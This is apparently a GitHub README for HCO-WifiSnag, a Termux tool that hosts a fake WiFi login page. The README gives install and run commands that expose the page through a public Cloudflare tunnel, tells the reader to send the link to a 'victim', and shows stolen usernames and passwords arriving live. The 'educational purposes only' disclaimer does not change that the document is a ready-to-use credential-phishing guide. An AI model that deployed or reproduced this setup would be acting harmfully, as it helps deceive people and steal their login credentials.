<h1 align="center">📶 HCO-WifiSnag</h1>
<p align="center"><b>Fake WiFi login phishing page simulation for educational purposes</b></p>

<p align="center">
  <a href="https://youtube.com/@hackers_colony_tech"><img src="https://img.shields.io/badge/YouTube-Hackers%20Colony-red?style=for-the-badge&logo=youtube" /></a>
  <a href="https://t.me/hackersColony"><img src="https://img.shields.io/badge/Telegram-Channel-blue?style=for-the-badge&logo=telegram" /></a>
  <a href="https://www.instagram.com/hackers_colony_official"><img src="https://img.shields.io/badge/Instagram-Follow-orange?style=for-the-badge&logo=instagram" /></a>
  <a href="https://hackerscolonyofficial.blogspot.com/?m=1"><img src="https://img.shields.io/badge/Website-Hackers%20Colony-lightgrey?style=for-the-badge&logo=google" /></a>
</p>

---

## 📂 About

**HCO-WifiSnag** is a WiFi login simulation phishing tool hosted from Termux. It collects credentials entered in the fake login page and displays them live inside Termux — all for educational and ethical hacking demonstrations only.

---

## ⚙️ How to Run in Termux

```bash
pkg update -y
pkg install git python -y
pkg install cloudflared -y
git clone https://github.com/Hackerscolonyofficial/HCO-WifiSnag
cd HCO-WifiSnag
python3 main.py
```

Wait for the tool to display:

```
╔═══════════════════════╗
║    HCO WifiSnag       ║
╚═══════════════════════╝
Subscribe to our YouTube channel to use this tool for free.
Redirecting in 10 seconds...
```

Then you'll get a Cloudflared link like:  
`https://xyz.trycloudflare.com` — send this to the test victim's phone.

Whenever someone logs in on that page, you'll instantly see:

```
📥 New credentials received!
Username: john123
Password: qwerty789
```

---

## ⚠️ Disclaimer

> This tool is created for **educational purposes only**.  
> Do **NOT** use it for illegal activities or without permission.  
> Hack responsibly. You are solely responsible for misuse.

---

## 👨‍💻 Code by Azhar

> "Hacking is not about breaking systems, it's about learning how they work."
